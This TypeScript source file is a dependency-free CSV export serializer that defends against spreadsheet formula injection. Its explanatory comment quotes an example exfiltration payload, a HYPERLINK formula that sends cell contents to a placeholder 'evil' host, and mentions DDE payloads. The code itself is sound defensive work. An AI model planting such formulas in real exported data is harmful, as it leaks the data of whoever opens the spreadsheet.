/**
 * Commercial Launch Phase B.5 — Data Export. A small, dependency-free
 * RFC-4180 CSV serializer — confirmed via a full-repo grep that no CSV/
 * XLSX library exists anywhere in this codebase, and CSV alone is
 * sufficient for a v1 export (row-per-record, opens cleanly in Excel/
 * Google Sheets/LibreOffice). Deliberately NOT importing "server-only":
 * this needs to run both in export API routes (server) and directly in
 * the browser for the Reports page's client-side CSV export (see
 * ReportsBoard.tsx), which already has the data in React state and has no
 * reason to round-trip it through a new server route.
 */

/** Quotes a single CSV field per RFC 4180: wrap in double quotes and
 * double any embedded quote, whenever the value contains a comma, quote,
 * or newline (CR or LF) that would otherwise break column alignment. */
function csvField(value: string): string {
  if (/[",\r\n]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}

// Security audit (commercial completion pass) — CSV/formula injection.
// Excel, Sheets, and LibreOffice all treat a cell whose text begins with
// =, +, -, @, a tab, or a CR as a formula to EVALUATE, not display —
// e.g. a customer/staff/supplier name of `=HYPERLINK("http://evil/?"&A1)`
// would silently turn into a clickable exfiltration link (or worse, a DDE
// payload on older Excel) the moment an owner opens an exported CSV in a
// spreadsheet app. Free-text fields across every export route
// (fullName/name/address/note/email) are exactly this: end-user-supplied
// strings (a customer's own name at signup, a staff member's account
// name, a supplier a manager typed in), not values this codebase
// controls. Neutralized by prefixing a single quote, the standard
// mitigation (OWASP "CSV Injection") — spreadsheet apps then render the
// text literally instead of evaluating it.
//
// Deliberately scoped to values whose ORIGINAL type was a string (not
// number/boolean) — a legitimate negative money amount like -500 must
// keep displaying as -500, not '−500; only free text can carry an
// attacker-authored formula.
const FORMULA_TRIGGER_PATTERN = /^[=+\-@\t\r]/;

function neutralizeFormulaInjection(text: string): string {
  return FORMULA_TRIGGER_PATTERN.test(text) ? `'${text}` : text;
}

function stringifyCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value === "number") return Number.isFinite(value) ? String(value) : "";
  if (typeof value === "boolean") return value ? "true" : "false";
  return neutralizeFormulaInjection(String(value));
}

export type CsvColumn<T> = {
  header: string;
  value: (row: T) => unknown;
};

/**
 * Serializes `rows` into a CSV string (header row + one row per record),
 * CRLF line endings per RFC 4180. Every column is derived via `value(row)`
 * rather than assuming rows are already flat objects, so callers can shape
 * (e.g. format money, resolve a label) inline instead of pre-mapping the
 * whole array first.
 */
export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const lines = [columns.map((c) => csvField(c.header)).join(",")];
  for (const row of rows) {
    lines.push(columns.map((c) => csvField(stringifyCell(c.value(row)))).join(","));
  }
  return lines.join("\r\n") + "\r\n";
}
